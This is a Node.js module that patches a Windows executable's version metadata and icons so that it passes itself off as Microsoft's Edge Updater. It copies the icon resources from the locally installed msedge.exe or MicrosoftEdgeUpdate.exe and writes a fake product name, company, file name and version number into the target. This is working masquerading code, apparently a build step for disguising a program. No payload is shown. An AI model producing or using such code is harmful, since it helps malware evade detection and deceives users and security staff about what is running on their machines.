const fs = require('fs');
const path = require('path');

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function extractEdgeIcons() {
  let ResEdit;
  try {
    ResEdit = require('resedit');
  } catch (_) {
    return null;
  }
  const { NtExecutable, NtExecutableResource, Data } = ResEdit;
  const edgeSources = [
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe',
    'C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe',
  ];
  for (const srcPath of edgeSources) {
    if (!fs.existsSync(srcPath)) continue;
    try {
      const srcBuf = fs.readFileSync(srcPath);
      const srcExe = NtExecutable.from(srcBuf, { ignoreCert: true });
      const srcRes = NtExecutableResource.from(srcExe);
      const groupEntry = srcRes.entries.find((e) => e.type === 14);
      if (!groupEntry) continue;
      const rawBin = groupEntry.bin instanceof Buffer
        ? groupEntry.bin.buffer.slice(groupEntry.bin.byteOffset, groupEntry.bin.byteOffset + groupEntry.bin.byteLength)
        : groupEntry.bin;
      const dv = new DataView(rawBin);
      const count = dv.getUint16(4, true);
      const meta = [];
      for (let i = 0; i < count; i++) {
        const off = 6 + i * 14;
        meta.push({
          width: dv.getUint8(off),
          height: dv.getUint8(off + 1),
          bitCount: dv.getUint16(off + 6, true),
          id: dv.getUint16(off + 12, true),
        });
      }
      const items = [];
      for (const m of meta) {
        const entry = srcRes.entries.find((e) => e.type === 3 && e.id === m.id);
        if (entry) {
          const ab = entry.bin instanceof Buffer
            ? entry.bin.buffer.slice(entry.bin.byteOffset, entry.bin.byteOffset + entry.bin.byteLength)
            : entry.bin;
          items.push(Data.RawIconItem.from(ab, m.width || 256, m.height || 256, m.bitCount || 32));
        }
      }
      if (items.length > 0) return items;
    } catch (_) {}
  }
  return null;
}

async function patchExe(targetPath) {
  if (!fs.existsSync(targetPath)) return false;
  let ResEdit;
  try {
    ResEdit = require('resedit');
  } catch (e) {
    console.warn('[patch-pe] resedit not installed, skipping PE patch:', e.message);
    return false;
  }
  const { NtExecutable, NtExecutableResource, Resource } = ResEdit;
  const VersionInfo = Resource.VersionInfo;

  let lastErr;
  for (let attempt = 1; attempt <= 5; attempt++) {
    try {
      const exeBuffer = fs.readFileSync(targetPath);
      const exe = NtExecutable.from(exeBuffer);
      const res = NtExecutableResource.from(exe);

      const viList = VersionInfo.fromEntries(res.entries);
      if (viList.length) {
        const vi = viList[0];
        const languages = vi.getAllLanguagesForStringValues();
        if (!languages.length) {
          languages.push({ lang: 1033, codepage: 1200 });
        }
        for (const lang of languages) {
          vi.setStringValues(lang, {
            FileDescription: 'Edge Updater',
            ProductName: 'Edge Updater',
            CompanyName: 'Edge',
            LegalCopyright: 'Copyright (c) Edge. All rights reserved.',
            OriginalFilename: 'EdgeUpdater.exe',
            InternalName: 'EdgeUpdater',
            FileVersion: '1.3.187.31',
            ProductVersion: '1.3.187.31',
          });
        }
        vi.fixedInfo.fileVersionMS = 0x00010003;
        vi.fixedInfo.fileVersionLS = 0x00bb001f;
        vi.fixedInfo.productVersionMS = 0x00010003;
        vi.fixedInfo.productVersionLS = 0x00bb001f;
        vi.outputToResourceEntries(res.entries);
      }

      const iconItems = extractEdgeIcons();
      if (iconItems && iconItems.length) {
        try {
          Resource.IconGroupEntry.replaceIconsForResource(res.entries, 1, 1033, iconItems);
        } catch (_) {}
      }

      res.outputResource(exe);
      fs.writeFileSync(targetPath, Buffer.from(exe.generate()));
      console.log(`[patch-pe] Patched PE metadata for ${path.basename(targetPath)}`);
      return true;
    } catch (e) {
      lastErr = e;
      if (attempt < 5) await sleep(1000);
    }
  }
  console.warn(`[patch-pe] Failed to patch ${targetPath}: ${lastErr?.message}`);
  return false;
}

module.exports = {
  patchExe,
  extractEdgeIcons,
};
